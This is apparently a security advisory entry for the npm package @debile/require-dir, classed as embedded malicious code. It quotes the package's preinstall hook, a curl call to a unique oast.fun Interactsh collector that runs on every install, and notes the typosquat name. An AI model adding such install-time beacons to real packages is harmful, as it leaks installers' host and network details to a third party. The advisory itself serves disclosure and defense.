summary: Preinstall beacon to Interactsh OOB collector on @debile/require-dir
details: package.json declares a preinstall script that runs `curl https://xgtktsypnmotaeqmgvdmqvxn785fypaau.oast.fun` on every `npm install`. The destination is a unique subdomain of oast.fun, the Interactsh out-of-band interaction service used to receive DNS/HTTP callbacks from targeted hosts. Installing the package causes the installer machine to contact this third-party collector, disclosing installer IP, hostname, and DNS resolver metadata to the operator of the subdomain. The package name also mimics the widely used `require-dir` module, consistent with a dependency-confusion / typosquat probe.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
